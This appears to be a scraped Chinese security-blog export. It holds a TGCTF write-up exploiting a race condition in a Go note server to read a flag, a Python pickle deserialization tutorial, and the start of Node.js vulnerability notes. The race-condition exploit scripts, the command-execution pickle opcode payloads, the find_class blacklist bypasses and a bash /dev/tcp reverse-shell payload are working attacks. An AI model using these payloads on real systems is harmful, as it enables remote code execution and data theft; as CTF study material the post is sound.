84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;text/template\u0026#34; \u0026#34;time\u0026#34; ) type Note struct { Name string ModTime string Size int64 IsMarkdown bool } var templates = template.Must(template.ParseGlob(\u0026#34;templates/*\u0026#34;)) type PageData struct { Notes []Note Error string } func blackJack(path string) error { if strings.Contains(path, \u0026#34;..\u0026#34;) || strings.Contains(path, \u0026#34;/\u0026#34;) || strings.Contains(path, \u0026#34;flag\u0026#34;) { return fmt.Errorf(\u0026#34;非法路径\u0026#34;) } return nil } func renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) { safe := templates.ExecuteTemplate(w, tmpl, data) if safe != nil { http.Error(w, safe.Error(), http.StatusInternalServerError) } } func renderError(w http.ResponseWriter, message string, code int) { w.WriteHeader(code) templates.ExecuteTemplate(w, \u0026#34;error.html\u0026#34;, map[string]interface{}{ \u0026#34;Code\u0026#34;: code, \u0026#34;Message\u0026#34;: message, }) } func main() { os.Mkdir(\u0026#34;notes\u0026#34;, 0755) safe := blackJack(\u0026#34;/flag\u0026#34;) //错误示范，return fmt.Errorf(\u0026#34;非法路径\u0026#34;) http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { files, safe := os.ReadDir(\u0026#34;notes\u0026#34;) if safe != nil { renderError(w, \u0026#34;无法读取目录\u0026#34;, http.StatusInternalServerError) return } var notes []Note for _, f := range files { if f.IsDir() { continue } info, _ := f.Info() notes = append(notes, Note{ Name: f.Name(), ModTime: info.ModTime().Format(\u0026#34;2006-01-02 15:04\u0026#34;), Size: info.Size(), IsMarkdown: strings.HasSuffix(f.Name(), \u0026#34;.md\u0026#34;), }) } renderTemplate(w, \u0026#34;index.html\u0026#34;, PageData{Notes: notes}) }) http.HandleFunc(\u0026#34;/read\u0026#34;, func(w http.ResponseWriter, r *http.Request) { name := r.URL.Query().Get(\u0026#34;name\u0026#34;) if safe = blackJack(name); safe != nil { renderError(w, safe.Error(), http.StatusBadRequest) return } file, safe := os.Open(filepath.Join(\u0026#34;notes\u0026#34;, name)) if safe != nil { renderError(w, \u0026#34;文件不存在\u0026#34;, http.StatusNotFound) return } data, safe := io.ReadAll(io.LimitReader(file, 10240)) if safe != nil { renderError(w, \u0026#34;读取失败\u0026#34;, http.StatusInternalServerError) return } if strings.HasSuffix(name, \u0026#34;.md\u0026#34;) { w.Header().Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;) fmt.Fprintf(w, `\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/5.1.0/github-markdown.min.css\u0026#34;\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body class=\u0026#34;markdown-body\u0026#34;\u0026gt;%s\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;`, data) } else { w.Header().Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/plain\u0026#34;) w.Write(data) } }) http.HandleFunc(\u0026#34;/write\u0026#34;, func(w http.ResponseWriter, r *http.Request) { if r.Method != \u0026#34;POST\u0026#34; { renderError(w, \u0026#34;方法不允许\u0026#34;, http.StatusMethodNotAllowed) return } name := r.FormValue(\u0026#34;name\u0026#34;) content := r.FormValue(\u0026#34;content\u0026#34;) if safe = blackJack(name); safe != nil { renderError(w, safe.Error(), http.StatusBadRequest) return } if r.FormValue(\u0026#34;format\u0026#34;) == \u0026#34;markdown\u0026#34; \u0026amp;\u0026amp; !strings.HasSuffix(name, \u0026#34;.md\u0026#34;) { name += \u0026#34;.md\u0026#34; } else { name += \u0026#34;.txt\u0026#34; } if len(content) \u0026gt; 10240 { content = content[:10240] } safe := os.WriteFile(filepath.Join(\u0026#34;notes\u0026#34;, name), []byte(content), 0600) if safe != nil { renderError(w, \u0026#34;保存失败\u0026#34;, http.StatusInternalServerError) return } http.Redirect(w, r, \u0026#34;/\u0026#34;, http.StatusSeeOther) }) http.HandleFunc(\u0026#34;/delete\u0026#34;, func(w http.ResponseWriter, r *http.Request) { name := r.URL.Query().Get(\u0026#34;name\u0026#34;) if safe = blackJack(name); safe != nil { renderError(w, safe.Error(), http.StatusBadRequest) return } safe := os.Remove(filepath.Join(\u0026#34;notes\u0026#34;, name)) if safe != nil { renderError(w, \u0026#34;删除失败\u0026#34;, http.StatusInternalServerError) return } http.Redirect(w, r, \u0026#34;/\u0026#34;, http.StatusSeeOther) }) // 静态文件服务 http.Handle(\u0026#34;/static/\u0026#34;, http.StripPrefix(\u0026#34;/static/\u0026#34;, http.FileServer(http.Dir(\u0026#34;static\u0026#34;)))) srv := \u0026amp;http.Server{ Addr: \u0026#34;:9046\u0026#34;, ReadTimeout: 10 * time.Second, WriteTimeout: 15 * time.Second, } log.Fatal(srv.ListenAndServe()) } 漏洞点在这\n1 2 3 4 if safe = blackJack(name); safe != nil { renderError(w, safe.Error(), http.StatusBadRequest) return } 在Go中，运算符 :=用于变量声明和赋值，并且=只能用于变量赋值。\n第一次输入一个任意的 name ，使得 safe 被赋值为 nil ，然后立刻读取flag，此时\nerr 还会是 nil\n官方exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import aiohttp import asyncio import time class Solver: def __init__(self, baseUrl): self.baseUrl = baseUrl self.READ_FILE_ENDPOINT = f\u0026#39;{self.baseUrl}\u0026#39; self.VALID_CHECK_PARAMETER = \u0026#39;/read?name=1\u0026#39; self.INVALID_CHECK_PARAMETER = \u0026#39;/read?name=../../../flag\u0026#39; self.RACE_CONDITION_JOBS = 100 async def raceValidationCheck(self, session, parameter): url = f\u0026#39;{self.READ_FILE_ENDPOINT}{parameter}\u0026#39; async with session.get(url) as response: return await response.text() async def raceCondition(self, session): tasks = list() for _ in range(self.RACE_CONDITION_JOBS): tasks.append(self.raceValidationCheck(session,self.VALID_CHECK_PARAMETER)) tasks.append(self.raceValidationCheck(session,self.INVALID_CHECK_PARAMETER)) return await asyncio.gather(*tasks) async def solve(self): async with aiohttp.ClientSession() as session: attempts = 1 finishedRaceConditionJobs = 0 while True: print(f\u0026#39;[*] Attempts \u0026lt; #{attempts} - Finished race conditionjobs: {finishedRaceConditionJobs}\u0026#39;) results = await self.raceCondition(session) attempts += 1 finishedRaceConditionJobs += self.RACE_CONDITION_JOBS for result in results: if \u0026#39;TGCTF{\u0026#39; not in result: continue print(f\u0026#39;\\n[+] We won the race window! Flag:{result.strip()}\u0026#39;) exit(0) if __name__== \u0026#39;__main__\u0026#39;: baseUrl = \u0026#39;http://127.0.0.1:63028/\u0026#39; solver = Solver(baseUrl) asyncio.run(solver.solve()) 拉蒙特徐的exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import aiohttp import asyncio import time class Solver: def __init__(self, baseUrl): self.baseUrl = baseUrl self.READ_FILE_ENDPOINT = f\u0026#39;{self.baseUrl}\u0026#39; self.VALID_CHECK_PARAMETER = \u0026#39;/write?name=123.md\u0026amp;content=flag\u0026amp;format=markdown\u0026#39; self.INVALID_CHECK_PARAMETER = \u0026#39;/read?name=../../../../../flag\u0026#39; self.RACE_CONDITION_JOBS = 100 async def setSessionCookie(self, session): await session.get(self.baseUrl) async def raceValidationCheck(self, session, parameter): url = f\u0026#39;{self.READ_FILE_ENDPOINT}{parameter}\u0026#39; async with session.get(url) as response: return await response.text() async def raceCondition(self, session): tasks = list() for _ in range(self.RACE_CONDITION_JOBS): tasks.append(self.raceValidationCheck(session, self.VALID_CHECK_PARAMETER)) tasks.append(self.raceValidationCheck(session, self.INVALID_CHECK_PARAMETER)) return await asyncio.gather(*tasks) async def solve(self): async with aiohttp.ClientSession() as session: await asyncio.sleep(1) # wait for the reverse proxy creation attempts = 1 finishedRaceConditionJobs = 0 while True: print(f\u0026#39;[*] Attempts #{attempts} - Finished race condition jobs: {finishedRaceConditionJobs}\u0026#39;, end=\u0026#39;\\r\u0026#39;) results = await self.raceCondition(session) attempts += 1 finishedRaceConditionJobs += self.RACE_CONDITION_JOBS for result in results: print(result) if \u0026#39;TGCTF{\u0026#39; not in result: continue print(f\u0026#39;\\n[+] We won the race window! Flag: {result.strip()}\u0026#39;) exit(0) if name == \u0026#39;__main__\u0026#39;: baseUrl = \u0026#39;http://node1.tgctf.woooo.tech:30308\u0026#39; # for local testing # baseUrl = \u0026#39;http://49.13.169.154:8088\u0026#39; solver = Solver(baseUrl) asyncio.run(solver.solve()) ","date":"2025-04-15T00:00:00Z","image":"https://0d000721999.github.io/p/2025tgctf%E5%A4%8D%E7%8E%B0/1.png","permalink":"https://0d000721999.github.io/p/2025tgctf%E5%A4%8D%E7%8E%B0/","title":"2025TGCTF复现"},{"content":"pickle反序列化 参考这篇：文章 - pickle反序列化初探 - 先知社区\n可序列化的对象 None 、 True 和 False 整数、浮点数、复数 str、byte、bytearray 只包含可封存对象的集合，包括 tuple、list、set 和 dict 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以） 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或 __getstate__() 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances） object.__reduce__() 函数 在开发时，可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 object.__reduce__() 返回一个 (callable, ([para1,para2...])[,...]) 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。 在下文pickle的opcode中， R 的作用与 object.__reduce__() 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 R 正好对应 object.__reduce__() 函数， object.__reduce__() 的返回值会作为 R 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 R 的。 漏洞利用 利用思路 任意代码执行或命令执行。 变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。 pickle EXP的简单demo 1 2 3 4 5 6 7 8 9 10 11 12 import pickle import os class genpoc(object): def __reduce__(self): s = \u0026#34;\u0026#34;\u0026#34;echo test \u0026gt;poc.txt\u0026#34;\u0026#34;\u0026#34; # 要执行的命令 return os.system, (s,) # reduce函数必须返回元组或字符串 e = genpoc() poc = pickle.dumps(e) print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令 变量覆盖 1 2 3 4 5 6 7 8 9 10 11 12 13 import pickle key1 = b\u0026#39;321\u0026#39; key2 = b\u0026#39;123\u0026#39; class A(object): def __reduce__(self): return (exec,(\u0026#34;key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;\u0026#34;,)) a = A() pickle_a = pickle.dumps(a) print(pickle_a) pickle.loads(pickle_a) print(key1, key2) 如何手写opcode 在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 __reduce__ 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。 在这里可以体会到为何pickle是一种语言，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。 根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。 opcode 描述 具体写法 栈上的变化 memo上的变化 c 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包） c[module]\\n[instance]\\n 获得的对象入栈 无 o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） o 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 无 i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） i[module]\\n[callable]\\n 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 无 N 实例化一个None N 获得的对象入栈 无 S 实例化一个字符串对象 S\u0026rsquo;xxx\u0026rsquo;\\n（也可以使用双引号、'等python字符串形式） 获得的对象入栈 无 V 实例化一个UNICODE字符串对象 Vxxx\\n 获得的对象入栈 无 I 实例化一个int对象 Ixxx\\n 获得的对象入栈 无 F 实例化一个float对象 Fx.x\\n 获得的对象入栈 无 R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 R 函数和参数出栈，函数的返回值入栈 无 . 程序结束，栈顶的一个元素作为pickle.loads()的返回值 . 无 无 ( 向栈中压入一个MARK标记 ( MARK标记入栈 无 t 寻找栈中的上一个MARK，并组合之间的数据为元组 t MARK标记以及被组合的数据出栈，获得的对象入栈 无 ) 向栈中直接压入一个空元组 ) 空元组入栈 无 l 寻找栈中的上一个MARK，并组合之间的数据为列表 l MARK标记以及被组合的数据出栈，获得的对象入栈 无 ] 向栈中直接压入一个空列表 ] 空列表入栈 无 d 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） d MARK标记以及被组合的数据出栈，获得的对象入栈 无 } 向栈中直接压入一个空字典 } 空字典入栈 无 p 将栈顶对象储存至memo_n pn\\n 无 对象被储存 g 将memo_n的对象压栈 gn\\n 对象被压栈 无 0 丢弃栈顶对象 0 栈顶对象被丢弃 无 b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 b 栈上第一个元素出栈 无 s 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 s 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 无 u 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 u MARK标记以及被组合的数据出栈，字典被更新 无 a 将栈的第一个元素append到第二个元素(列表)中 a 栈顶元素出栈，第二个元素（列表）被更新 无 e 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 e MARK标记以及被组合的数据出栈，列表被更新 无 全局变量覆盖 python源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # secret.py name=\u0026#39;TEST3213qkfsmfo\u0026#39; # main.py import pickle import secret opcode=\u0026#39;\u0026#39;\u0026#39;c__main__ secret (S\u0026#39;name\u0026#39; S\u0026#39;1\u0026#39; db.\u0026#39;\u0026#39;\u0026#39; print(\u0026#39;before:\u0026#39;,secret.name) output=pickle.loads(opcode.encode()) print(\u0026#39;output:\u0026#39;,output) print(\u0026#39;after:\u0026#39;,secret.name) 首先，通过 c 获取全局变量 secret ，然后建立一个字典，并使用 b 对secret进行属性设置，使用到的payload：\n1 2 3 4 5 opcode=\u0026#39;\u0026#39;\u0026#39;c__main__ secret (S\u0026#39;name\u0026#39; S\u0026#39;1\u0026#39; db.\u0026#39;\u0026#39;\u0026#39; 函数执行 与函数执行相关的opcode有三个： R 、 i 、 o ，所以我们可以从三个方向进行构造：\nR ： 1 2 3 4 b\u0026#39;\u0026#39;\u0026#39;cos system (S\u0026#39;whoami\u0026#39; tR.\u0026#39;\u0026#39;\u0026#39; i ： 1 2 3 4 b\u0026#39;\u0026#39;\u0026#39;(S\u0026#39;whoami\u0026#39; ios system .\u0026#39;\u0026#39;\u0026#39; o ： 1 2 3 4 b\u0026#39;\u0026#39;\u0026#39;(cos system S\u0026#39;whoami\u0026#39; o.\u0026#39;\u0026#39;\u0026#39; 实例化对象 实例化对象是一种特殊的函数执行，这里简单的使用 R 构造一下，其他方式类似：\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Student: def __init__(self, name, age): self.name = name self.age = age data=b\u0026#39;\u0026#39;\u0026#39;c__main__ Student (S\u0026#39;XiaoMing\u0026#39; S\u0026#34;20\u0026#34; tR.\u0026#39;\u0026#39;\u0026#39; a=pickle.loads(data) print(a.name,a.age) CTF实战 做题之前：了解pickle.Unpickler.find_class() 由于官方针对pickle的安全问题的建议是修改find_class()，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。 什么时候会调用find_class()：\n从opcode角度看，当出现c、i、b'\\x93'时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。 从python代码来看，find_class()只会在解析opcode时调用一次，所以只要绕过opcode执行过程，find_class()就不会再调用，也就是说find_class()只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过__import__绕过一些黑名单。 Code-Breaking:picklecode 题目将pickle能够引入的模块限定为builtins，并且设置了子模块黑名单：{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}，于是我们能够直接利用的模块有：\nbuiltins模块中，黑名单外的子模块。 已经import的模块：io、builtins（需要先利用builtins模块中的函数） 黑名单中没有getattr，所以可以通过getattr获取io或builtins的子模块以及子模块的子模块:)，而builtins里有eval、exec等危险函数，即使在黑名单中，也可以通过getattr获得。pickle不能直接获取builtins一级模块，但可以通过builtins.globals()获得builtins；这样就可以执行任意代码了。payload为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 b\u0026#39;\u0026#39;\u0026#39;cbuiltins getattr p0 (cbuiltins dict S\u0026#39;get\u0026#39; tRp1 cbuiltins globals )Rp2 00g1 (g2 S\u0026#39;builtins\u0026#39; tRp3 0g0 (g3 S\u0026#39;eval\u0026#39; tR(S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39; tR. \u0026#39;\u0026#39;\u0026#39; watevrCTF-2019:Pickle Store 因为题目是黑盒，所以没有黑白名单限制，直接改cookie反弹shell即可。payload：\n1 2 3 4 5 b\u0026#39;\u0026#39;\u0026#39;cos system (S\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; tR. \u0026#39;\u0026#39;\u0026#39; pker的使用 可以使用pker进行原变量覆盖、函数执行、实例化新的对象。\n使用方法与示例 pker中的针对pickle的特殊语法需要重点掌握（后文给出示例） 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。 pker主要用到GLOBAL、INST、OBJ三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 以下module都可以是包含`.`的子module 调用函数时，注意传入的参数类型要和示例一致 对应的opcode会被生成，但并不与pker代码相互等价 GLOBAL 对应opcode：b\u0026#39;c\u0026#39; 获取module下的一个全局对象（没有import的也可以，比如下面的os）： GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;) 输入：module,instance(callable、module都是instance) INST 对应opcode：b\u0026#39;i\u0026#39; 建立并入栈一个对象（可以执行一个函数）： INST(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;ls\u0026#39;) 输入：module,callable,para OBJ 对应opcode：b\u0026#39;o\u0026#39; 建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））： OBJ(GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;), \u0026#39;ls\u0026#39;) 输入：callable,para xxx(xx,...) 对应opcode：b\u0026#39;R\u0026#39; 使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用） li[0]=321 或 globals_dic[\u0026#39;local_var\u0026#39;]=\u0026#39;hello\u0026#39; 对应opcode：b\u0026#39;s\u0026#39; 更新列表或字典的某项的值 xx.attr=123 对应opcode：b\u0026#39;b\u0026#39; 对xx对象进行属性设置 return 对应opcode：b\u0026#39;0\u0026#39; 出栈（作为pickle.loads函数的返回值）： return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组） 注意：\n由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为左值，需要索引时只能先获取相应的函数（如getattr、dict.get）才能进行。但是因为存在s、u、b操作符，作为右值是可以的。即“查值不行，赋值可以”。 pker解析S时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode: 1 2 test=\u0026#34;123\u0026#34; return test 被解析为：\n1 b\u0026#34;S\u0026#39;123\u0026#39;\\np0\\n0g0\\n.\u0026#34; pker：全局变量覆盖 覆盖直接由执行文件引入的secret模块中的name与category变量： 1 2 3 4 secret=GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) # python的执行文件被解析为__main__对象，secret在该对象从属下 secret.name=\u0026#39;1\u0026#39; secret.category=\u0026#39;2\u0026#39; 覆盖引入模块的变量： 1 2 game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = \u0026#39;123\u0026#39; 接下来会给出一些具体的基本操作的实例。\npker：函数执行 通过b'R'调用： 1 2 3 4 s=\u0026#39;whoami\u0026#39; system = GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;) system(s) # `b\u0026#39;R\u0026#39;`调用 return 通过b'i'调用： 1 INST(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;whoami\u0026#39;) 通过b'c'与b'o'调用： 1 OBJ(GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;), \u0026#39;whoami\u0026#39;) 多参数调用函数 1 2 INST(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;[, par0,par1...]) OBJ(GLOBAL(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;)[, par0,par1...]) pker：实例化对象 实例化对象是一种特殊的函数执行 1 2 3 4 5 6 7 8 animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal # 或者 animal = OBJ(GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;), \u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal 其中，python原文件中包含： 1 2 3 4 5 class Animal: def __init__(self, name, category): self.name = name self.category = category 也可以先实例化再赋值： 1 2 3 4 animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;) animal.name=\u0026#39;1\u0026#39; animal.category=\u0026#39;2\u0026#39; return animal 手动辅助 拼接opcode：将第一个pickle流结尾表示结束的.去掉，两者拼接起来即可。 建立普通的类时，可以先pickle.dumps，再拼接至payload。 CTF实战 Code-Breaking: picklecode 解析思路见前文手写opcode的CTF实战部分，pker代码为：\n1 2 3 4 5 6 7 8 getattr=GLOBAL(\u0026#39;builtins\u0026#39;,\u0026#39;getattr\u0026#39;) dict=GLOBAL(\u0026#39;builtins\u0026#39;,\u0026#39;dict\u0026#39;) dict_get=getattr(dict,\u0026#39;get\u0026#39;) glo_dic=GLOBAL(\u0026#39;builtins\u0026#39;,\u0026#39;globals\u0026#39;)() builtins=dict_get(glo_dic,\u0026#39;builtins\u0026#39;) eval=getattr(builtins,\u0026#39;eval\u0026#39;) eval(\u0026#39;print(\u0026#34;123\u0026#34;)\u0026#39;) return BalsnCTF:pyshv1 题目的find_class只允许sys模块，并且对象名中不能有.号。意图很明显，限制子模块，只允许一级模块。 sys模块有一个字典对象modules，它包含了运行时所有py程序所导入的所有模块，并决定了python引入的模块，如果字典被改变，引入的模块就会改变。modules中还包括了sys本身。我们可以利用自己包含自己这点绕过限制，具体过程为：\n由于sys自身被包含在自身的子类里，我们可以利用这点使用s赋值，向后递进一级，引入sys.modules的子模块：sys.modules['sys']=sys.modules，此时就相当于sys=sys.modules。这样我们就可以利用原sys.modules下的对象了，即sys.modules.xxx。 首先获取modules的get函数，然后类似于上一步，再使用s把modules中的sys模块更新为os模块：sys['sys']=sys.get('os')。 使用c获取system，之后就可以执行系统命令了。 整个利用过程还是很巧妙的，pker代码为：\n1 2 3 4 5 6 7 8 modules=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;modules\u0026#39;) modules[\u0026#39;sys\u0026#39;]=modules modules_get=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;get\u0026#39;) os=modules_get(\u0026#39;os\u0026#39;) modules[\u0026#39;sys\u0026#39;]=os system=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;system\u0026#39;) system(\u0026#39;whoami\u0026#39;) return BalsnCTF:pyshv2 与v1类似，题目的find_class只允许structs模块，并且对象名中不能有.号，只允许一级模块。其中，structs是个空模块。但是在find_class中调用了__import__函数：\n1 2 3 4 5 6 7 class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or \u0026#39;.\u0026#39; in name: raise KeyError(\u0026#39;The pickle is spoilt :(\u0026#39;) module = __import__(module) # 注意这里调用了__import__ return getattr(module, name) 注意python的以下几条性质：\n__builtins__是所有模块公有的字典，记录所有内建函数，可以通过对__builtins__内相应key对应函数的修改劫持相应的函数。由于题目调用了__import__函数，我们可以通过修改__import__劫持getattr函数。 __dict__列表储存并决定了一个对象的所有属性，如果其内容被改变，属性也会改变。 c的实现过程调用了find_class函数（顺带一提，它实际上是先import再调用find_class，但是由于python的import语句其实是使用了五个参数调用的__import，无法利用），而本题的find_class中多调用了一次__imoprt__，随后调用getattr，这包含了一个查值的过程，这一点很重要。 然后我们理一下利用过程：\n目标：structs.__builtins__['eval']→需要structs.__builtins__.get函数。 实现二级跳转：劫持__import__为structs.__getattribute__，opcodecstructs变为structs.__getattribute__(structs).xxx。 结合1、2：structs.__getattribute__(structs)要返回structs.__builtins__；xxx则设置为get。 利用structs.__dict__对structs赋值新属性structs.structs为structs.__builtins__，以便structs.__getattribute__(structs)返回structs.__builtins__。 pker实现：\n1 2 3 4 5 6 7 8 9 __dict__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__dict__\u0026#39;) # structs的属性dict __builtins__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__builtins__\u0026#39;) # 内建函数dict gtat = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__getattribute__\u0026#39;) # 获取structs.__getattribute__ __builtins__[\u0026#39;__import__\u0026#39;] = gtat # 劫持__import__函数 __dict__[\u0026#39;structs\u0026#39;] = __builtins__ # 把structs.structs属性赋值为__builtins__ builtin_get = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;get\u0026#39;) # structs.__getattribute__(\u0026#39;structs\u0026#39;).get eval = builtin_get(\u0026#39;eval\u0026#39;) # structs.structs[\u0026#39;eval\u0026#39;]（即__builtins__[\u0026#39;eval\u0026#39;] eval(\u0026#39;print(123)\u0026#39;) return ","date":"2025-04-15T00:00:00Z","image":"https://0d000721999.github.io/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg","permalink":"https://0d000721999.github.io/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"pickle反序列化"},{"content":"nodejs常见漏洞学习 参考：Node.js 常见漏洞学习与总结-先知社区\n​ φ(゜▽゜*)♪咦，又好了！\n语言特性和缺点 大小写特性 1 2 3 4 5 toUpperCase() toLowerCase() 对于toUpperCase(): 字符\u0026#34;ı\u0026#34;、\u0026#34;ſ\u0026#34; 经过toUpperCase处理后结果为 \u0026#34;I\u0026#34;、\u0026#34;S\u0026#34; 对于toLowerCase(): 字符\u0026#34;K\u0026#34;经过toLowerCase处理后结果为\u0026#34;k\u0026#34;(这个K不是K) 弱类型比较 1 2 3 4 5 6 console.log(1==\u0026#39;1\u0026#39;); //true console.log(1\u0026gt;\u0026#39;2\u0026#39;); //false console.log(\u0026#39;1\u0026#39;\u0026lt;\u0026#39;2\u0026#39;); //true console.log(111\u0026gt;\u0026#39;3\u0026#39;); //true console.log(\u0026#39;111\u0026#39;\u0026gt;\u0026#39;3\u0026#39;); //false console.log(\u0026#39;asd\u0026#39;\u0026gt;1); //false 总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false\n1 2 3 4 5 6 console.log([]==[]); //false console.log([]\u0026gt;[]); //false console.log([6,2]\u0026gt;[5]); //true console.log([100,2]\u0026lt;\u0026#39;test\u0026#39;); //true console.log([1,2]\u0026lt;\u0026#39;2\u0026#39;); //true console.log([11,16]\u0026lt;\u0026#34;10\u0026#34;); //false 总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较\n相等的情况\n1 2 3 4 console.log(null==undefined) // 输出：true console.log(null===undefined) // 输出：false console.log(NaN==NaN) // 输出：false console.log(NaN===NaN) // 输出：false 拼接\n1 2 3 4 console.log(5+[6,6]); //56,3 console.log(\u0026#34;5\u0026#34;+6); //56 console.log(\u0026#34;5\u0026#34;+[6,6]); //56,6 console.log(\u0026#34;5\u0026#34;+[\u0026#34;6\u0026#34;,\u0026#34;6\u0026#34;]); //56,6 MD5绕过 